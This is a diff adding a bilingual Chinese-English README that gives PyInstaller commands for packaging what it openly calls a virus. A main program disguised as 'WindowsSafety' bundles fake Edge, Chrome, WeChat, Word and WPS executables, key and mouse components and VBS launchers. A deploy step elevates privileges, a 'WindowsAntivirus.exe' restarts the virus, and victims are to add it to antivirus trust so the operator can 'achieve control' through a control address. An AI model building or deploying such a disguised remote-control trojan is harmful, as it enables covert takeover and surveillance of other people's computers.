@@ -1,0 +1,39 @@
+如果你需要打包此软件，请参考以下打包命令。
+
+1.先将主程序进行打包，需要将主程序下的所有程序一同打包。
+命令：
+pyinstaller --onefile --add-data "Hedge.exe;." --add-data "request.manifest;." --add-data "Hexplorer.exe;." --add-data "Hvmware.exe;." --add-data "Hall.exe;." --add-data "Hwechat.exe;." --add-data "Hwps.exe;." --add-data "Hword.exe;." --add-data "Hchrome.exe;." --add-data "Windows Key.exe;." --add-data "Windows Mouse.exe;." --add-data "g.jpg;." --add-data "l.exe;." --add-data "run.vbs;." --add-data "runall.vbs;." --name "WindowsSafety" --add-data "WindowsAntivirus.exe;." --uac-admin -w -F 客户端.py
+
+2.将打包好的主程序“WindowsSafety.exe”和其他文件一同打包为一个.exe，用于快速部署病毒。部署的脚本文件是deploy.py
+命令：
+pyinstaller --onefile --add-data "request.manifest;." --add-data "run.vbs;." --add-data "WindowsSafety.exe;." --add-data "WindowsAntivirus.exe;." --add-data "Modify address.exe;." --uac-admin -F deploy.py
+
+你可以在打包命令的后面添加其他参数，例如你可以添加 [ -i ] 参数指定应用程序的图标
+示例：
+pyinstaller --onefile --add-data "request.manifest;." --add-data "run.vbs;." --add-data "WindowsSafety.exe;." --add-data "WindowsAntivirus.exe;." --add-data "Modify address.exe;." --uac-admin -F deploy.py -i picture.png
+
+注意：现在的打包文件夹下没有主程序“WindowsSafety.exe”，这需要你自己去打包，你只需要打包好主程序，紧接着使用第二步的命令生成部署程序。这样即可完成，你可以将改程序在其他电脑中运行，需要在杀毒软件中添加信任，即可实现控制。如果你没有添加信任，杀毒软件可能会报毒，并被识别为恶意软件。
+源码中是包含地址的手动输入，你可以自行指定而无需手动输入，将地址重定向为你的控制端地址即可。
+
+“WindowsAntivirus.exe”是一个简单保护程序，用于重启病毒，当然你也可以自己修改。
+
+
+
+If you need to package this software, please refer to the packaging command below.
+
+1. Package the main program first, and all programs under the main program need to be packaged together.
+Commands:
+pyinstaller --onefile --add-data "Hedge.exe; ." --add-data "request.manifest; ." --add-data "Hexplorer.exe; ." --add-data "Hvmware.exe; ." --add-data "Hall.exe; ." --add-data "Hwechat.exe; ." --add-data "Hwps.exe; ." --add-data "Hword.exe; ." --add-data "Hchrome.exe; ." --add-data "Windows Key.exe; ." --add-data "Windows Mouse.exe; ." --add-data "g.jpg; ." --add-data "l.exe; ." --add-data "run.vbs; ." --add-data "runall.vbs; ." --name "WindowsSafety" --add-data "WindowsAntivirus.exe; "--uac-admin -w-F client.py
+
+2. Package the main program WindowsSafety.exe together with other files as an.exe for rapid virus deployment. The deployment script file is deploy.py
+Commands:
+pyinstaller --onefile --add-data "request.manifest; ." --add-data "run.vbs; ." --add-data "WindowsSafety.exe; ." --add-data "WindowsAntivirus.exe; ." --add-data "Modify address.exe; ." --uac-admin -F deploy.py
+
+You can add additional parameters to the end of the package command, for example you can add the [-i] parameter to specify the icon of the application
+Example:
+pyinstaller --onefile --add-data "request.manifest; ." --add-data "run.vbs; ." --add-data "WindowsSafety.exe; ." --add-data "WindowsAntivirus.exe; ." --add-data "Modify address.exe; ." --uac-admin -F deploy.py -i picture.png
+
+Note: there is no main program "WindowsSafe.exe" in the packaging folder, which requires you to package it yourself, you only need to package the main program, and then use the command of the second step to generate the deployment program. This can be done, you can change the program to run in other computers, need to add trust in the anti-virus software, you can achieve control. If you do not add trust, anti-virus software may report the virus and be identified as malware.
+The source code contains the manual input of the address, you can specify without manual input, the address will be redirected to your control address.
+
+"WindowsAntivirus.exe" is a simple protection program for restarting viruses, of course, you can also modify yourself.
